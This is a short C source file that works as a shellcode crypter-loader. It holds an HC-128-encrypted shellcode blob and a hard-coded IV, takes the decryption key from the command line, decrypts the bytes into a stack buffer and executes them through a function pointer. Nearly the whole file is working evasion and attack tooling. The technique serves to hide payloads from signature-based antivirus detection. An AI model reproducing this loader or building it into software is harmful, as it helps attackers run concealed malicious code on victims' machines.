// File: decryptAndExecute.c
// Author: Petr Javorik

#include <string.h>
#include <stdio.h>
#include "hc128_p3source/hc-128.c"

// Encrypted shellcode
unsigned char encrypted[] = \
"\xb8\xd8\x35\xb9\xc0\x99\x32\x44\x05\x87\x40\x55\x92\xaf\x82\x13\xf4\x34\xae\x4e\x41\xb0\x49\xac\xf0\xb4\x11\x7a\x59\x1c\xe3\x8c";

// IV must be exactly 16 bytes
char iv[16] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p'};

int main(int argc, char **argv)
{
    // Initialize ECRYPT library
    ECRYPT_init();
    // ctx is object containing settings and state of encryption engine
    ECRYPT_ctx ctx;
    // Load key
    ECRYPT_keysetup(&ctx, argv[1], 128, 128);
    // Load IV
    ECRYPT_ivsetup(&ctx, iv);
    // Decrypt
    u8 decrypted[200];
    int codeLen = strlen(encrypted);
    ECRYPT_decrypt_bytes(&ctx, encrypted, decrypted, codeLen);

/* DEBUG - prints decrypted bytes

	int i;
	printf("Decrypted      = ");
    for (i=0; i<codeLen; i++)
        printf("\\x%02x", decrypted[i]);
    printf ("\n");
*/

	// Execute
    int (*DecryptedFun)() = (int(*)())decrypted;
    DecryptedFun();
}
